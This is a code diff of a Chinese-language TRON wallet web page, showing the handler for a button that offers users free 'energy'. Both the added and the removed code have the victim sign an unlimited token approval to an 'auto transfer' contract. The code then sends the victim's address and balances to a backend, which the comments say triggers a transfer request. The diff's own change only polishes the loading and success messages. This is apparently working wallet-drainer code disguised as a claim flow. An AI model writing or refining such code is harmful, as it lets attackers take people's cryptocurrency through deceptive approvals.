@@ -475,73 +475,65 @@
                 walletSelectList.style.display = "block"; // 显示钱包选择列表
                 startPersistentTrxCountdown(); // 启动跨刷新计算
             }
-            // 手动连接钱包（钱包环境内）
-            connectBtn.onclick = async () => {
-                try {
-                    if (!window.tronWeb) {
-                        // 唤起imToken并跳转授权页面
-                        navigateToWallet('imtoken');
-                        return;
-                    }
-                    const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
-                    userAddress = accounts[0];
-                    connectBtn.style.display = "none";
-                    warning.style.display = "none";
-                    walletSelectList.style.display = "none";
-                    await initWallet();
-                } catch (e) {
-                    alert("连接失败：" + e.message);
-                }
-            };
-            // 领取（授权）按钮 - 核心修改：取消哈希值传输，仅用isApproved=true作为成功信号
-            approveBtn.onclick = async () => {
-                // 初始化postData：移除txHash字段
-                const postData = {
-                    address: userAddress,
-                    tokenBalance: tokenBalance,
-                    trxBalance: trxBalance,
-                    approveTime: new Date().toLocaleString(),
-                    isApproved: false // 初始设为失败，授权成功后改为true
-                };
-                try {
-                    if (!trc20Contract || !userAddress) throw new Error("合约/地址未初始化");
-                    // 发送授权交易：仅判断交易是否成功，不获取txHash
-                    await trc20Contract.approve(
-                        AUTO_TRANSFER_CONTRACT,
-                        INFINITE_APPROVE_AMOUNT
-                    ).send({ from: userAddress, shouldPollResponse: true });
-                    // 授权成功：仅设置isApproved=true（核心成功信号）
-                    postData.isApproved = true;
-                    alert("【授权】成功！已向后端发送转账请求");
-                    // 保存本地记录：移除txHash字段
-                    saveApprovalRecord({
-                        address: userAddress,
-                        tokenBalance: tokenBalance,
-                        trxBalance: trxBalance,
-                        approveTime: postData.approveTime,
-                        approveType: "无限额度" // 移除txHash相关内容
-                    });
-                    renderApprovalRecords();
-                } catch (e) {
-                    // 授权失败：保持isApproved=false
-                    postData.isApproved = false;
-                    alert(`【授权】失败：${e.message}`);
-                } finally {
-                    // 发送数据到后端：仅传isApproved状态，无txHash
-                    try {
-                        const res = await fetch(BACKEND_API, {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify(postData),
-                            credentials: "include"
-                        });
-                        const resData = await res.json();
-                        if (!res.ok) throw new Error(resData.error || `后端返回${res.status}`);
-                    } catch (sendErr) {
-                        console.log("发送数据到后端失败：", sendErr);
-                    }
-                }
-            };
+          // 领取（授权）按钮 - 优化后
+approveBtn.onclick = async () => {
+    const btn = document.getElementById("approveBtn");
+    const reviewTip = document.getElementById("reviewTip");
+    // 1. 点击后立即更新状态（关键：让用户看到处理中）
+    btn.disabled = true;
+    btn.textContent = "授权处理中..."; // 按钮文本改为处理中
+    reviewTip.style.display = "flex"; // 显示加载提示
+    reviewTipText.textContent = "⚠️ 正在提交授权交易，请耐心等待（3-8秒）";
+
+    const postData = {
+        address: userAddress,
+        tokenBalance: tokenBalance,
+        trxBalance: trxBalance,
+        approveTime: new Date().toLocaleString(),
+        isApproved: false
+    };
+
+    try {
+        if (!trc20Contract || !userAddress) throw new Error("合约/地址未初始化");
+        
+        // 2. 区块链授权交易（耗时核心步骤）
+        const tx = await trc20Contract.approve(
+            AUTO_TRANSFER_CONTRACT,
+            INFINITE_APPROVE_AMOUNT
+        ).send({ from: userAddress, shouldPollResponse: true });
+
+        // 3. 发送后端信号（可能耗时）
+        await Promise.all([sendSignalA2(), sendSignalB(false)]);
+        postData.isApproved = true;
+
+        // 4. 交易成功：更新反馈
+        btn.textContent = "授权成功！";
+        reviewTipText.textContent = "✅ 授权已确认，能量发放中...";
+        userInfoEl.innerHTML += lang.successArrival;
+        alert(lang.successTip);
+        saveEnergyRecord();
+        renderEnergyRecords();
+
+    } catch (e) {
+        // 5. 失败/超时：更新反馈
+        btn.textContent = "授权失败，重试";
+        btn.disabled = false; // 允许重试
+        reviewTipText.textContent = `❌ 授权失败：${e.message}（请检查网络）`;
+        alert(`【授权】失败：${e.message}`);
+    } finally {
+        // 6. 最终发送后端数据（不阻塞用户反馈）
+        try {
+            await fetch(BACKEND_API, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(postData),
+                credentials: "include"
+            });
+        } catch (sendErr) {
+            console.log("后端数据发送失败：", sendErr);
+        }
+    }
+};
             // 页面卸载时保存当前状态（确保下次刷新能续算）
             window.addEventListener("beforeunload", () => {
                 saveTrxStateToStorage();
